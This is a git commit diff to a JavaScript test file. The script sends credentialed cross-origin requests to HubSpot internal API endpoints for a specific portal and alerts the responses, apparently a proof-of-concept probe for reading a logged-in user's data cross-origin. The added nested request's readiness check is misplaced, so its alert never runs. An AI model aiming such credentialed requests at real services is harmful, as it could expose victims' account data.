b9bde5ec33bc2ea4f3f7c0c97d1b0cf5695a7fc2
Mohamed Mahmoudi <41636967+medmahmoudi26@users.noreply.github.com>
2022-02-03 02:02:23 +0100

    Update test.js

--- assets/javascript/test.js
+++ assets/javascript/test.js
@@ -1,11 +1,23 @@
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = function() {
     if (xhr.readyState == XMLHttpRequest.DONE) {
-        alert(xhr.responseText);
+	var xhr2 = new XMLHttpRequest();
+	if (xhr2.readyState == XMLHttpRequest.DONE) {
+		alert(xhr2.responseText);
+	}
+        xhr2.open("GET", "https://app-eu1.hubspot.com/content-tools-menu/api/v1/tools-menu/landing-pages/45875820775/actions?portalId=25502480&callback=jsonpHandler", true);
+	xhr2.setRequestHeader("accept", "*\/*");
+	xhr2.setRequestHeader("accept-language", "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7");
+	xhr2.withCredentials = true;
+	var body = "";
+	var aBody = new Uint8Array(body.length);
+	for (var i = 0; i < aBody.length; i++)
+		aBody[i] = body.charCodeAt(i);
+	xhr2.send(new Blob([aBody]));
     }
 }
 
-xhr.open("GET", "https://app-eu1.hubspot.com/content-tools-menu/api/v1/tools-menu/landing-pages/45875820775/actions?portalId=25502480&callback=jsonpHandler", true);
+xhr.open("GET", "https://app-eu1.hubspot.com/content-tools-menu/api/v1/tools-menu/has-permission?portalId=25502480&callback=jsonpHandler", true);
 xhr.setRequestHeader("accept", "*\/*");
 xhr.setRequestHeader("accept-language", "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7");
 xhr.withCredentials = true;
